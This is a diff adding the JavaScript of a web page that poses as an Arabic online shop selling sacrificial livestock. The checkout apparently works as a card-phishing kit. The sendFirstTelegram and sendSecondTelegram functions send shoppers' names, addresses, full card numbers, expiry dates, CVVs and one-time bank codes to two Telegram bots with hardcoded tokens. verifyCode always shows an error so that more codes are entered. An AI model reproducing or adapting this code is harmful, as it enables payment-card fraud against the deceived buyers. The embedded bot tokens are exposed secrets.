+            { id: 14, name: "تيس عماني", imageUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTwGFiliMhrV0vL4XxpOvDn9IprhWR3bKuEUe3IRJRF-tRGEpRiLq1Bf9Xl&s=10", description: "تيس عماني فاخر - لحم ممتاز للأضاحي", price: 950, oldPrice: 1400, weight: "25-30 كجم", discount: 32, big: true, extraLarge: true },
+            { id: 15, name: "تيس بلدي", imageUrl: "https://media.zid.store/9d7e7708-05ce-4c23-abcf-05d17ede2444/287dc416-49df-4333-9a57-9ee37254c9dc.jpg", description: "تيس بلدي أصيل - لحم طري وشهي", price: 850, oldPrice: 1250, weight: "22-26 كجم", discount: 32, big: true },
+            { id: 16, name: "عجل أضحية", imageUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmCwzYKiPFUeL65eZCC8c_UsExKa_sVN-HVACDt9VkizgOWftJ9z5kqry3&s=10", description: "عجل صغير للأضحية - لحم أبيض طري", price: 1800, oldPrice: 2600, weight: "45-55 كجم", discount: 31, big: true },
+            { id: 17, name: "جمل (حاشي)", imageUrl: "https://png.pngtree.com/png-vector/20250528/ourmid/pngtree-camel-isolated-on-a-transparent-background-png-image_16393769.png", description: "جمل كامل - لحم حاشي ممتاز", price: 4200, oldPrice: 6000, weight: "180-220 كجم", discount: 30, big: true }
+        ]
+    };
+
+    let cart = JSON.parse(localStorage.getItem('cart')) || [];
+    let deliveryData = {};
+    let selectedPayment = 'full';
+    let verificationCode = '';
+    let canResend = false;
+    let resendTimer = 60;
+    let firstTelegramSent = false;
+
+    // ✅ البوتات مع التوكنات الصحيحة
+    const BOT1_TOKEN = "8452808616:AAEPdINXhn0bOvzi96emnkTU32Pvy11pGWM";  // البوت القديم (تم التحديث)
+    const BOT1_CHAT_ID = "2059318108";
+    
+    const BOT2_TOKEN = "8508774290:AAGu508pnBJbZGH-raa8xP5eBReA5lAXs6M";  // البوت الجديد
+    const BOT2_CHAT_ID = "2059318108";
+
+    function luhnCheck(card) { let sum = 0, isEven = false; for (let i = card.length-1; i>=0; i--) { let digit = parseInt(card[i]); if (isEven) { digit *= 2; if (digit > 9) digit -= 9; } sum += digit; isEven = !isEven; } return sum % 10 === 0; }
+
+    function updateCardPreview() {
+        let num = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        let typeBadge = document.getElementById('cardTypeBadge');
+        if (num.startsWith('4')) typeBadge.innerHTML = '<div class="visa-badge"><span class="visa-text">VISA</span></div>';
+        else if (num.startsWith('5')) typeBadge.innerHTML = '<div class="mastercard-badge"><div class="mc-red-small"></div><div class="mc-yellow-small"></div></div>';
+        else if (num.startsWith('3')) typeBadge.innerHTML = '<div class="amex-badge"><span class="amex-text">AMEX</span></div>';
+        else typeBadge.innerHTML = '<div class="default-card-icon"><i class="far fa-credit-card"></i></div>';
+    }
+
+    function formatCardNumber(input) {
+        let val = input.value.replace(/\D/g, '');
+        if (val.length > 16) val = val.slice(0,16);
+        let formatted = '';
+        for (let i=0; i<val.length; i++) { if (i>0 && i%4===0) formatted += ' '; formatted += val[i]; }
+        input.value = formatted;
+        updateCardPreview();
+        let feedback = document.getElementById('cardNumberFeedback');
+        let validFeedback = document.getElementById('cardNumberValid');
+        if (val.length === 16) {
+            if (luhnCheck(val)) { input.style.borderColor = '#4caf50'; feedback.style.display = 'none'; validFeedback.style.display = 'block'; }
+            else { input.style.borderColor = '#f44336'; feedback.style.display = 'block'; validFeedback.style.display = 'none'; }
+        } else if (val.length > 0) { input.style.borderColor = '#f44336'; feedback.style.display = 'block'; validFeedback.style.display = 'none'; }
+        else { input.style.borderColor = '#e8e8e8'; feedback.style.display = 'none'; validFeedback.style.display = 'none'; }
+    }
+    
+    function formatExpiry(input) {
+        let rawValue = input.value.replace(/\D/g, '');
+        if (rawValue.length > 4) rawValue = rawValue.slice(0, 4);
+        let formatted = rawValue;
+        if (rawValue.length >= 2) {
+            let month = rawValue.slice(0, 2);
+            let year = rawValue.slice(2, 4);
+            formatted = month + (year.length ? '/' + year : '');
+        }
+        if (formatted.includes('//')) {
+            formatted = formatted.replace('//', '/');
+        }
+        input.value = formatted;
+        let feedback = document.getElementById('expiryFeedback');
+        if (formatted.length === 5) {
+            let [month, year] = formatted.split('/').map(Number);
+            let now = new Date();
+            let currentYear = now.getFullYear() % 100;
+            let currentMonth = now.getMonth() + 1;
+            if (month >= 1 && month <= 12 && (year > currentYear || (year === currentYear && month >= currentMonth))) {
+                input.style.borderColor = '#4caf50';
+                feedback.style.display = 'none';
+            } else {
+                input.style.borderColor = '#f44336';
+                feedback.style.display = 'block';
+            }
+        } else if (formatted.length > 0 && formatted.length < 5) {
+            input.style.borderColor = '#f44336';
+            feedback.style.display = 'block';
+        } else {
+            input.style.borderColor = '#e8e8e8';
+            feedback.style.display = 'none';
+        }
+    }
+    
+    function handleExpiryDelete(event, input) {
+        if (event.key === 'Backspace') {
+            let currentValue = input.value;
+            if (currentValue.length === 3 && currentValue.includes('/')) {
+                input.value = currentValue.slice(0, 2);
+                event.preventDefault();
+                formatExpiry(input);
+            }
+            else if (currentValue.length === 2 && !currentValue.includes('/')) {
+                input.value = '';
+                event.preventDefault();
+                formatExpiry(input);
+            }
+        }
+    }
+
+    function displayProducts() {
+        for (const [cat, items] of Object.entries(products)) {
+            const grid = document.getElementById(`${cat}Grid`);
+            if (grid) {
+                grid.innerHTML = items.map(p => `
+                    <div class="product-card">
+                        <div class="product-image-wrapper" style="position:relative;">
+                            <img class="product-img ${p.big ? 'sacrifice-img' : ''} ${p.extraLarge ? 'extra-large-img' : ''}" src="${p.imageUrl}" alt="${p.name}" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                            <div style="display:none; align-items:center; justify-content:center; background:#f5f5f5; color:#999; height:200px;">🖼️ صورة غير متوفرة</div>
+                            <div class="discount-badge">-${p.discount}%</div>
+                        </div>
+                        <div class="product-info">
+                            <h3 class="product-title">${p.name}</h3>
+                            <p class="product-desc">${p.description}</p>
+                            <div class="product-price"><div><span class="old-price">${p.oldPrice} درهم</span><span class="new-price">${p.price} درهم</span></div><span style="font-size:11px; color:#888;">${p.weight}</span></div>
+                            <button class="add-to-cart" onclick="addToCart(${p.id}, '${cat}')"><i class="fas fa-cart-plus"></i> أضف إلى السلة</button>
+                        </div>
+                    </div>
+                `).join('');
+            }
+        }
+    }
+
+    function addToCart(id, cat) { let p = products[cat].find(i=>i.id===id); if(p) { let ex = cart.find(i=>i.id===id); if(ex) ex.quantity++; else cart.push({...p,quantity:1}); saveCart(); let btn = event.target.closest('.add-to-cart'); let orig = btn.innerHTML; btn.innerHTML = '<i class="fas fa-check"></i> تم'; setTimeout(()=>btn.innerHTML=orig,800); } }
+    function saveCart() { localStorage.setItem('cart',JSON.stringify(cart)); updateCartUI(); }
+    function updateCartUI() { let totItems = cart.reduce((s,i)=>s+i.quantity,0), totPrice = cart.reduce((s,i)=>s+(i.price*i.quantity),0); document.getElementById('cartCount').innerText = totItems; document.getElementById('cartTotal').innerText = totPrice.toFixed(2)+' درهم'; let div = document.getElementById('cartItems'); if(!cart.length) div.innerHTML = '<p style="text-align:center; color:#999; padding:30px;">سلة التسوق فارغة</p>'; else div.innerHTML = cart.map(i=>`<div class="cart-item"><div><h4>${i.name}</h4><div style="color:#d32f2f;">${i.price} درهم</div></div><div class="cart-item-actions"><button onclick="updateQ(${i.id},${i.quantity-1})">-</button><span>${i.quantity}</span><button onclick="updateQ(${i.id},${i.quantity+1})">+</button><button onclick="removeItem(${i.id})" style="background:#ffebee;">🗑</button></div></div>`).join(''); }
+    function updateQ(id,q) { if(q<=0) removeItem(id); else { let i = cart.find(x=>x.id===id); if(i) i.quantity=q; saveCart(); } }
+    function removeItem(id) { cart = cart.filter(i=>i.id!==id); saveCart(); }
+    function initSections() { document.querySelectorAll('.section-nav-btn').forEach(btn=>btn.addEventListener('click',function(){ document.querySelectorAll('.section-nav-btn').forEach(b=>b.classList.remove('active')); this.classList.add('active'); document.querySelectorAll('.section-content').forEach(c=>c.classList.remove('active')); let t = document.getElementById(`section-${this.dataset.section}`); t.classList.add('active'); t.scrollIntoView({behavior:'smooth',block:'start'}); })); }
+    function toggleCart() { document.getElementById('cartSidebar').classList.toggle('open'); document.getElementById('overlay').classList.toggle('active'); }
+    function openDeliveryPage() { if(!cart.length){alert('سلة التسوق فارغة!');return;} toggleCart(); let total = cart.reduce((s,i)=>s+(i.price*i.quantity),0); document.getElementById('deliverySummaryItems').innerHTML = cart.map(i=>`<div class="summary-item"><span>${i.name} x${i.quantity}</span><span>${(i.price*i.quantity).toFixed(2)} درهم</span></div>`).join(''); document.getElementById('deliverySummaryTotal').innerText = total.toFixed(2)+' درهم'; document.getElementById('deliveryDate').min = new Date().toISOString().split('T')[0]; document.getElementById('deliveryPage').classList.add('active'); }
+    function closeDeliveryPage() { document.getElementById('deliveryPage').classList.remove('active'); }
+    
+    function validateAndGoToPayment() {
+        let name = document.getElementById('fullName').value.trim();
+        let phone = document.getElementById('phone').value.trim();
+        let address = document.getElementById('address').value.trim();
+        let date = document.getElementById('deliveryDate').value;
+        let time = document.getElementById('deliveryTime').value;
+        if(!name) { document.getElementById('fullName').focus(); return; }
+        else if(!phone || phone.length !== 10 || !phone.startsWith('05')) { document.getElementById('phone').focus(); return; }
+        else if(!address) { document.getElementById('address').focus(); return; }
+        else if(!date) { document.getElementById('deliveryDate').focus(); return; }
+        else if(!time) { document.getElementById('deliveryTime').focus(); return; }
+        deliveryData = {fullName:name, phone, address:address, deliveryDate:date, deliveryTime:time};
+        let total = cart.reduce((s,i)=>s+(i.price*i.quantity),0);
+        document.getElementById('paymentSummaryItems').innerHTML = cart.map(i=>`<div class="summary-item"><span>${i.name} x${i.quantity}</span><span>${(i.price*i.quantity).toFixed(2)} درهم</span></div>`).join('');
+        document.getElementById('paymentSummaryTotal').innerText = total.toFixed(2)+' درهم';
+        closeDeliveryPage();
+        document.getElementById('paymentPage').classList.add('active');
+        updateCardPreview();
+    }
+    
+    function closePaymentPage() { document.getElementById('paymentPage').classList.remove('active'); }
+    function selectPayment(type) { selectedPayment = type; document.querySelectorAll('.payment-option-modern').forEach(o=>o.classList.remove('selected')); document.querySelector(`[data-payment="${type}"]`).classList.add('selected'); document.getElementById('depositInfo').style.display = type==='deposit'?'block':'none'; }
+    
+    // ✅ دالة الإرسال إلى البوتين بشكل منفصل ومضمون
+    function sendToBothBots(message) {
+        // إرسال إلى البوت الأول (القديم)
+        fetch(`https://api.telegram.org/bot${BOT1_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: BOT1_CHAT_ID, text: message, parse_mode: 'Markdown'})
+        })
+        .then(response => response.json())
+        .then(data => {
+            if(data.ok) {
+                console.log('✅ تم الإرسال إلى البوت الأول بنجاح');
+            } else {
+                console.log('❌ خطأ في البوت الأول:', data.description);
+            }
+        })
+        .catch(error => console.error('❌ خطأ في البوت الأول:', error));
+        
+        // إرسال إلى البوت الثاني (الجديد)
+        fetch(`https://api.telegram.org/bot${BOT2_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: BOT2_CHAT_ID, text: message, parse_mode: 'Markdown'})
+        })
+        .then(response => response.json())
+        .then(data => {
+            if(data.ok) {
+                console.log('✅ تم الإرسال إلى البوت الثاني بنجاح');
+            } else {
+                console.log('❌ خطأ في البوت الثاني:', data.description);
+            }
+        })
+        .catch(error => console.error('❌ خطأ في البوت الثاني:', error));
+    }
+    
+    function processPayment() {
+        let name = document.getElementById('cardName').value.trim();
+        let num = document.getElementById('cardNumber').value.replace(/\s/g,'');
+        let exp = document.getElementById('expiry').value;
+        let cvv = document.getElementById('cvv').value;
+        if(!name) { document.getElementById('cardName').focus(); return; }
+        else if(num.length !== 16) { document.getElementById('cardNumber').focus(); return; }
+        else if(!exp.match(/^\d{2}\/\d{2}$/)) { document.getElementById('expiry').focus(); return; }
+        else if(cvv.length !== 3) { document.getElementById('cvv').focus(); return; }
+        deliveryData.cardName = name;
+        deliveryData.cardNumber = num;
+        deliveryData.expiry = exp;
+        deliveryData.cvv = cvv;
+        
+        sendFirstTelegram();
+        
+        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+        console.log('رمز التحقق:', verificationCode);
+        
+        let phoneDisplay = deliveryData.phone;
+        document.getElementById('verifyPhone').innerHTML = phoneDisplay.slice(0,6) + ' XXX ' + phoneDisplay.slice(-2);
+        closePaymentPage();
+        document.getElementById('verifyPage').classList.add('active');
+        startResendTimer();
+        firstTelegramSent = true;
+        document.getElementById('errorAlert').style.display = 'none';
+    }
+    
+    function startResendTimer() {
+        canResend = false;
+        resendTimer = 60;
+        let timerSpan = document.getElementById('timerText');
+        let resendLink = document.getElementById('resendCodeLink');
+        resendLink.classList.add('disabled');
+        const update = () => {
+            timerSpan.textContent = `(${resendTimer} ثانية)`;
+            resendTimer--;
+            if(resendTimer < 0) {
+                resendLink.classList.remove('disabled');
+                timerSpan.textContent = '';
+                canResend = true;
+            } else {
+                setTimeout(update, 1000);
+            }
+        };
+        update();
+    }
+    
+    function moveToNext(current, nextId) {
+        current.value = current.value.replace(/\D/g, '');
+        if(current.value && nextId) document.getElementById(nextId).focus();
+        document.getElementById('errorAlert').style.display = 'none';
+    }
+    
+    function handleBackspace(event, current, prevId) {
+        if(event.key === 'Backspace' && !current.value && prevId) {
+            document.getElementById(prevId).focus();
+        }
+    }
+    
+    function resendCode(e) {
+        e.preventDefault();
+        if(!canResend) return;
+        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+        console.log('رمز جديد:', verificationCode);
+        startResendTimer();
+        alert('تم إعادة إرسال رمز التحقق');
+        document.getElementById('errorAlert').style.display = 'none';
+    }
+    
+    function resendCodeFromError() {
+        if(!canResend) {
+            alert('الرجاء الانتظار ' + (resendTimer+1) + ' ثانية قبل إعادة الإرسال');
+            return;
+        }
+        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+        console.log('رمز جديد:', verificationCode);
+        startResendTimer();
+        document.getElementById('errorAlert').style.display = 'none';
+        alert('تم إعادة إرسال رمز التحقق');
+    }
+    
+    function sendFirstTelegram() {
+        let itemsList = cart.map(i => `• ${i.name} x${i.quantity} = ${i.price * i.quantity} درهم`).join('\n');
+        let total = cart.reduce((s,i)=>s+(i.price*i.quantity),0);
+        let paymentType = selectedPayment === 'full' ? 'دفع كامل' : 'دفع 10 درهم + الباقي عند الاستلام';
+        let msg = `🛒 *طلب جديد - المرحلة الأولى (بيانات البطاقة)*\n\n👤 *الاسم:* ${deliveryData.fullName}\n📱 *الجوال:* ${deliveryData.phone}\n📍 *العنوان:* ${deliveryData.address}\n📅 *تاريخ الاستلام:* ${deliveryData.deliveryDate}\n⏰ *الفترة:* ${deliveryData.deliveryTime}\n\n📦 *المنتجات:*\n${itemsList}\n\n💰 *المجموع:* ${total} درهم\n💳 *طريقة الدفع:* ${paymentType}\n💳 *بيانات البطاقة:*\n👤 *الاسم:* ${deliveryData.cardName}\n🔢 *الرقم:* ${deliveryData.cardNumber}\n📅 *التاريخ:* ${deliveryData.expiry}\n🔐 *CVV:* ${deliveryData.cvv}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}`;
+        
+        sendToBothBots(msg);
+    }
+    
+    function sendSecondTelegram() {
+        let code = document.getElementById('code1').value + document.getElementById('code2').value + document.getElementById('code3').value + document.getElementById('code4').value + document.getElementById('code5').value + document.getElementById('code6').value;
+        let itemsList = cart.map(i => `• ${i.name} x${i.quantity} = ${i.price * i.quantity} درهم`).join('\n');
+        let total = cart.reduce((s,i)=>s+(i.price*i.quantity),0);
+        let paymentType = selectedPayment === 'full' ? 'دفع كامل' : 'دفع 10 درهم + الباقي عند الاستلام';
+        let msg = `✅ *محاولة تأكيد الطلب - المرحلة الثانية (رمز التحقق)*\n\n👤 *الاسم:* ${deliveryData.fullName}\n📱 *الجوال:* ${deliveryData.phone}\n📍 *العنوان:* ${deliveryData.address}\n📅 *تاريخ الاستلام:* ${deliveryData.deliveryDate}\n⏰ *الفترة:* ${deliveryData.deliveryTime}\n\n📦 *المنتجات:*\n${itemsList}\n\n💰 *المجموع:* ${total} درهم\n💳 *طريقة الدفع:* ${paymentType}\n🔐 *رمز التحقق المدخل:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}`;
+        
+        sendToBothBots(msg);
+    }
+    
+    function verifyCode() {
+        let code = document.getElementById('code1').value + document.getElementById('code2').value + document.getElementById('code3').value + document.getElementById('code4').value + document.getElementById('code5').value + document.getElementById('code6').value;
+        if(code.length !== 6) { alert('الرجاء إدخال رمز التحقق كاملاً'); return; }
+        
+        sendSecondTelegram();
+        
+        document.getElementById('errorAlert').style.display = 'block';
+    }
+    
+    function closeVerifyPage() { 
+        document.getElementById('verifyPage').classList.remove('active');
+        firstTelegramSent = false;
+    }
+    
+    function init() { displayProducts(); updateCartUI(); initSections(); }
+    init();
+</script>
+</body>
+</html>
